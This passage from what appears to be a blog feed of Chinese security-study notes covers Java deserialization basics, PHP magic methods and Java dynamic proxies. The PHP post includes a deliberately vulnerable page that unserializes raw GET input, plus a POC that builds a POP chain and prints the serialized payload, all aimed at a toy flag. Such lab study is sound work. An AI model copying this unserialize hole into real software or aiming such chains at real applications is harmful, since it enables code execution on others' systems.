readObject()</h2><p>在序列化和反序列化的过程中，如果被序列化的类定义了 <code>writeObject()</code> 和 <code>readObject()</code> 方法，虚拟机会试图调用对象类里面的方法，进行用户自定义的序列化和反序列化，如果没有这有的方法则默认调用 <code>ObjectOutputStream</code> 和 <code>ObjectInputStream</code> 的默认方法</p><h2 id="Base64方法打印序列化字符串"><a href="#Base64方法打印序列化字符串" class="headerlink" title="Base64方法打印序列化字符串"></a>Base64方法打印序列化字符串</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211107185316661.png" alt="image-20211107185316661"></p><p>参考文章</p><p><a href="https://www.cnblogs.com/niceyoo/p/10596657.html">https://www.cnblogs.com/niceyoo/p/10596657.html</a></p><p><a href="https://dyfloveslife.github.io/2020/03/21/Serialization-and-Deserialization-in-Java/">https://dyfloveslife.github.io/2020/03/21/Serialization-and-Deserialization-in-Java/</a></p><p><a href="https://paper.seebug.org/312/">https://paper.seebug.org/312/</a></p><p><a href="https://yinwc.github.io/2020/02/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://yinwc.github.io/2020/02/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://y4er.com/post/java-deserialization-1/">https://y4er.com/post/java-deserialization-1/</a></p><p><a href="https://www.hollischuang.com/archives/1140">https://www.hollischuang.com/archives/1140</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-反序列化基础&quot;&gt;&lt;a href=&quot;#Java-反序列化基础&quot; class=&quot;headerlink&quot; title=&quot;Java 反序列化基础&quot;&gt;&lt;/a&gt;Java 反序列化基础&lt;/h1&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;head</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>PHP序列化魔法函数</title>
    <link href="http://example.com/2021/10/21/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/"/>
    <id>http://example.com/2021/10/21/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/</id>
    <published>2021-10-21T15:29:59.000Z</published>
    <updated>2021-10-23T15:11:20.501Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP序列化复习"><a href="#PHP序列化复习" class="headerlink" title="PHP序列化复习"></a>PHP序列化复习</h1><p>之前学的不是那么牢靠，所以这里来复习一下</p><h2 id="常用魔术方法"><a href="#常用魔术方法" class="headerlink" title="常用魔术方法"></a>常用魔术方法</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">__construct()   <span class="hljs-regexp">//</span>类一执行就开始调用，其作用是拿来初始化一些值<br>__destruct() <span class="hljs-regexp">//</span>对象被销毁时触发<br>__sleep()   <span class="hljs-regexp">//</span>使用serialize时触发<br>__wakeup()    <span class="hljs-regexp">//</span>使用unserialize时触发<br>__set() <span class="hljs-regexp">//</span>用于将数据写入不可访问的属性<br>__get() <span class="hljs-regexp">//</span>用于从不可访问的属性读取数据<br>__call() <span class="hljs-regexp">//</span>在对象上下文中调用不可访问的方法时触发<br>__toString() <span class="hljs-regexp">//</span>把类当作字符串使用时触发<br>__invoke() <span class="hljs-regexp">//</span>当脚本尝试将对象调用为函数时触发<br>__isset() <span class="hljs-regexp">//</span>在不可访问的属性上调用isset()或empty()触发<br>__unset() <span class="hljs-regexp">//</span>在不可访问的属性上使用unset()时触发<br><br>__callStatic()  <span class="hljs-regexp">//</span>在静态上下文中调用不可访问的方法时触发<br></code></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h3><p>构造函数，在创建类时自动调用，常用于初始化参数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211020224108586.png" alt="image-20211020224108586"></p><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p>析构函数，在类被销毁得时候调用</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211020224324684.png" alt="image-20211020224324684"></p><h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h3><p>它不能返回父类私有成员的名字，可以用 Serializable 接口来替代。<code>__sleep()</code>方法常用于提交未提交的数据，或类似的清理操作</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211020224546140.png" alt="image-20211020224546140"></p><blockquote><p>如果函数存在，序列化就会出现一些问题</p></blockquote><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h3><p>在反序列化时调用</p><p><img src="D:\markdown\image-20211020231909276.png" alt="image-20211020231909276"></p><p>这里反序列化时，类会自动调用 <code>__wakeup</code> 最后会销毁，这里不会调用到构造函数</p><h3 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h3><p>这个方法用来为私有成员属性设置值，有两个参数，第一个参数为你要是指值得属性名，第二个参数就是需要设置得值。</p><blockquote><p>通俗理解就是利用这个方法使我们可以在类外给私有变量重新赋值</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> $uname;<br>    <span class="hljs-keyword">private</span> $passwd;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$uname,$passwd</span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;uname = $uname;<br>        <span class="hljs-keyword">$this</span>-&gt;passwd = $passwd;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;调用构造函数\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;销毁时调用\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params">$property, $value</span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;$property = $value;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;uname;<br>    &#125;<br>&#125;<br><br>$t = <span class="hljs-keyword">new</span> Test(<span class="hljs-string">&quot;lcdm123&quot;</span>, <span class="hljs-string">&quot;passwd&quot;</span>);<br>$t-&gt;show();<br>$t-&gt;uname = <span class="hljs-string">&quot;test&quot;</span>;<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>$t-&gt;show();<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211020235111821.png" alt="image-20211020235111821"></p><h3 id="get"><a href="#get" class="headerlink" title="__get()"></a>__get()</h3><p>用来获取私有成员属性值，有一个参数，参数传入你要获取的成员属性的名称，返回获取的属性值。</p><blockquote><p>用来在类外获取私有变量</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> $uname;<br>    <span class="hljs-keyword">private</span> $passwd;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$uname,$passwd</span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;uname = $uname;<br>        <span class="hljs-keyword">$this</span>-&gt;passwd = $passwd;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;调用构造函数\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;销毁时调用\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params">$property, $value</span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;$property = $value;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params">$name</span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;$name;<br>    &#125;<br>&#125;<br><br>$t = <span class="hljs-keyword">new</span> Test(<span class="hljs-string">&quot;lcdm123&quot;</span>, <span class="hljs-string">&quot;passwd&quot;</span>);<br><span class="hljs-keyword">echo</span> $t-&gt;uname;<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>$t-&gt;uname = <span class="hljs-string">&quot;test&quot;</span>;<br><span class="hljs-keyword">echo</span> $t-&gt;uname;<br><span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="D:\markdown\image-20211020235505059.png" alt="image-20211020235505059"></p><h3 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h3><p>如果你试着调用一个对象中不存在或被权限控制中的方法，它就会被自动调用</p><p><img src="D:\markdown\image-20211021183145903.png" alt="image-20211021183145903"></p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><p>把类当成字符串使用时自动调用</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211021211818736.png" alt="image-20211021211818736"></p><h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h3><p>将类当成函数方法时调用</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211021212227538.png" alt="image-20211021212227538"></p><h3 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h3><p>定义这个魔术方法方便我们在类外测试类中是否定义了某个私有变量</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211021214354276.png" alt="image-20211021214354276"></p><h3 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h3><p>销毁一个类的私有变量，当销毁一个不存在的属性时也会自动调用 <code>__unset()</code> 函数</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211021231856031.png" alt="image-20211021231856031"></p><h3 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a>__callStatic()</h3><p>当创建一个静态方法以调用该类中不存在的一个方法时使用此函数，与 <code>__call()</code> 相同</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211021232730554.png" alt="image-20211021232730554"></p><h2 id="POP链构造测试"><a href="#POP链构造测试" class="headerlink" title="POP链构造测试"></a>POP链构造测试</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211023222416562.png" alt="image-20211023222416562"></p><p>构造简单的 POP 链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">start_gg</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $mod1;<br>        <span class="hljs-keyword">public</span> $mod2;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test1();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Call</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $mod1;<br>        <span class="hljs-keyword">public</span> $mod2;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test1</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;mod1-&gt;test2();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CallFunc</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $mod1;<br>        <span class="hljs-keyword">public</span> $mod2;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params">$test2,$arr</span>)</span><br><span class="hljs-function">        </span>&#123;<br>                $s1 = <span class="hljs-keyword">$this</span>-&gt;mod1;<br>                $s1();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InvokeFunc</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $mod1;<br>        <span class="hljs-keyword">public</span> $mod2;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;mod2 = <span class="hljs-string">&quot;字符串拼接&quot;</span>.<span class="hljs-keyword">$this</span>-&gt;mod1;<br>        &#125; <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ToStringFunc</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $str1;<br>        <span class="hljs-keyword">public</span> $str2;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">$this</span>-&gt;str1-&gt;get_flag();<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1&quot;</span>;<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag:&quot;</span>.<span class="hljs-string">&quot;flag&#123;Success&#125;&quot;</span>;<br>        &#125;<br>&#125;<br>$a = $_GET[<span class="hljs-string">&#x27;string&#x27;</span>];<br>unserialize($a);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">start_gg</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $mod1;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> CallFunc();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CallFunc</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $mod1;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;mod1 =<span class="hljs-keyword">new</span> InvokeFunc();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InvokeFunc</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $mod1 ;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;mod1 = <span class="hljs-keyword">new</span> ToStringFunc();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ToStringFunc</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> $str1 ;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;str1 = <span class="hljs-keyword">new</span> GetFlag();<br>        &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag:&quot;</span>.<span class="hljs-string">&quot;flag&#123;test&#125;&quot;</span>;<br>        &#125;<br>&#125;<br>$a = <span class="hljs-keyword">new</span> start_gg();<br><span class="hljs-keyword">echo</span> serialize($a);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//     O:8:&quot;start_gg&quot;:1:&#123;s:4:&quot;mod1&quot;;O:8:&quot;CallFunc&quot;:1:&#123;s:4:&quot;mod1&quot;;O:10:&quot;InvokeFunc&quot;:1:&#123;s:4:&quot;mod1&quot;;O:12:&quot;ToStringFunc&quot;:1:&#123;s:4:&quot;str1&quot;;O:7:&quot;GetFlag&quot;:0:&#123;&#125;&#125;&#125;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>这里我直接倒着分析的首先我们想要调用<code>get_flag()</code>方法获取到结果就需要执行<code>__toString()</code> 方法，这里看到可以利用 <code>InvokeFunc</code> 类中的 <code>__invoke()</code> 方法，就需要调用 <code>CallFunc</code> 类中的 <code>__call()</code> 方法，就需要使用 <code>star_gg</code> 类中的析构函数。这样一条链子就可以 </p><p><code>start_gg-&gt;__destruct()  --&gt; CallFunc-&gt;__call() --&gt;InvokeFunc-&gt;__invoke()  --&gt; ToStringFunc-&gt;__toString() --&gt; GetFlag-&gt;get_flag()</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211023225653694.png" alt="image-20211023225653694"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>熟练使用这些函数有助于后面我们可以更快捷的构建出反序列化 POP 链，如果还有遗漏的后期补上。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PHP序列化复习&quot;&gt;&lt;a href=&quot;#PHP序列化复习&quot; class=&quot;headerlink&quot; title=&quot;PHP序列化复习&quot;&gt;&lt;/a&gt;PHP序列化复习&lt;/h1&gt;&lt;p&gt;之前学的不是那么牢靠，所以这里来复习一下&lt;/p&gt;
&lt;h2 id=&quot;常用魔术方法&quot;&gt;&lt;a hr</summary>
      
    
    
    
    <category term="编程语言" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Java代理</title>
    <link href="http://example.com/2021/10/19/Java%E4%BB%A3%E7%90%86/"/>
    <id>http://example.com/2021/10/19/Java%E4%BB%A3%E7%90%86/</id>
    <published>2021-10-19T14:54:14.000Z</published>
    <updated>2021-11-07T07:12:09.893Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java代理"><a href="#Java代理" class="headerlink" title="Java代理"></a>Java代理</h1><p>当一个对象不能直接使用，可以创建一个客户端和目标对象直接创建一个中介，这个中介就是代理</p><p>代理模式是通过代理对象访问目标对象，这样可以在目标对象基础上增强额外功能</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211017142945434.png" alt="image-20211017142945434"></p><h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>静态代理比较简单，就是代理对象与被代理对象继承相同的接口，代理对象负责调用被代理类（委托类）的对象的相关方法去提供具体的服务，一个代理类只能为一个接口服务，要是有很多服务的话需要开很多代理类。</p><ol><li>代理类是自己手工实现的，自己创建的java类，表示代理类</li><li>代理的目标是确定的</li></ol><p>优点：容易实现，使用方便</p><p>缺点：在目标类比较多时，会产生大量的代理类；当接口改变时，影响的目标类多</p><p>例：</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211017154240849.png" alt="image-20211017154240849"></p><blockquote><p>如果需要扩展函数功能可以直接在代理类中修改即可</p></blockquote><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>动态代理是由反射实现，可以用一个代理类实现所有的代理功能。</p><ul><li>不用创建动态代理类</li><li>可以给不同目标随时创建代理</li></ul><p>动态代理的实现：</p><ol><li>JDK动态代理<ul><li>使用java反射包中的类和接口实现动态代理的功能</li><li>反射包：<code>java.lang.reflect</code> 里面有三个类：<code>InvocationHandler</code>  <code>Method</code>  <code>Proxy</code></li></ul></li><li>cglib 动态代理<ul><li>cglib 是第三方工具库，创建代理对象</li><li>cglib 的原理是继承，cglib 通过继承目标类，创建子类，在子类中重写父类中同名的方法</li><li>cglib 是继承，重写方法，所以要求目标类和方法不能是 final，cglib 再框架中使用</li></ul></li></ol><p>创建动态代理类实例可以使用<code>newProxyInstance()</code>或者使用<code>getProxyClass()</code>获取代理对象再使用反射的方法创建      </p><p><strong>实现动态代理的步骤</strong></p><ol><li>创建接口</li><li>定义目标类实现该接口方法</li><li>实现 <code>InvocationHandler</code> 接口，重写 <code>invoke</code> 方法，完成代理的功能</li><li>使用 <code>Proxy</code> 类的静态方法，创建代理对象。并把返回值转为接口类型</li></ol><p>例：</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211019190539572.png" alt="image-20211019190539572"></p><ul><li>创建动态代理类的时候主要是实现 <code>InvokationHandler</code> 接口，重写 <code>invoke</code> 方法</li><li>调用代理类的时候 创建代理对象，创建 <code>InvokationHandler</code> 对象, 创建代理对象（参数固定就是那些，返回值为接口类）就可以执行函数方法了</li><li>运行代理类时会自动调用动态代理的invoke方法</li></ul><p> <code>InvokationHandler</code> 接口中定义了一个 <code>invoke</code> 方法，所以需要在动态代理类中重写一下</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211019195340609.png" alt="image-20211019195340609"></p><h2 id="代理类与序列化"><a href="#代理类与序列化" class="headerlink" title="代理类与序列化"></a>代理类与序列化</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211019222558776.png" alt="image-20211019222558776"></p><p><img src="D:\markdown\image-20211019223756860.png" alt="image-20211019223756860"></p><blockquote><p>这里为什么会调用 <code>invoke</code> 方法呢？？？？</p></blockquote><p>下面这段些话还有点不懂，应该是序列化与反序列化还不太熟悉吧</p><p>动态代理生成的类在 <code>序列化/反序列化</code> 时不会序列化该类的成员变量，并且 <code>serialVersionUID</code> 为 <code>0L</code>， 也就是说将该类的 Class 对象传递给<code>java.io.ObjectStreamClass</code> 的静态 lookup 方法时，返回的 <code>ObjectStreamClass</code> 实例将具有以下特性</p><ol><li>调用其<code>getSerialVersionUID</code>方法将返回 0L</li><li>调用其<code>getFields</code>方法将返回长度为零的数组</li><li>调用其<code>getField</code>方法将返回 null </li></ol><p>但其父类 <code>(java.lang.reflect.Proxy)</code> 在序列化时不受影响，父类中的h变量<code>(InvocationHandler)</code> 将会被序列化，这个h存储了动态代理类的处理类实例以及动态代理的接口类的实现类的实例。</p><p>动态代理生成的对象 <code>(com.sun.proxy.$ProxyXXX)</code> 序列化的时候会使用一个特殊的协议：<code>TC_PROXYCLASSDESC(0x7D)</code>，这个常量在 <code>java.io.ObjectStreamConstants</code> 中定义的。在反序列化时也不会调用 <code>java.io.ObjectInputStream</code> 类的 <code>resolveClass</code> 方法而是调用<code>resolveProxyClass</code> 方法来转换成类对象的。</p><p>参考文章</p><p><a href="https://www.cnblogs.com/whirly/p/10154887.html">https://www.cnblogs.com/whirly/p/10154887.html</a></p><p><a href="https://www.jianshu.com/p/9bcac608c714">https://www.jianshu.com/p/9bcac608c714</a></p><p><a href="https://www.cnblogs.com/tr1ple/p/12260664.html">https://www.cnblogs.com/tr1ple/p/12260664.html</a></p><p><a 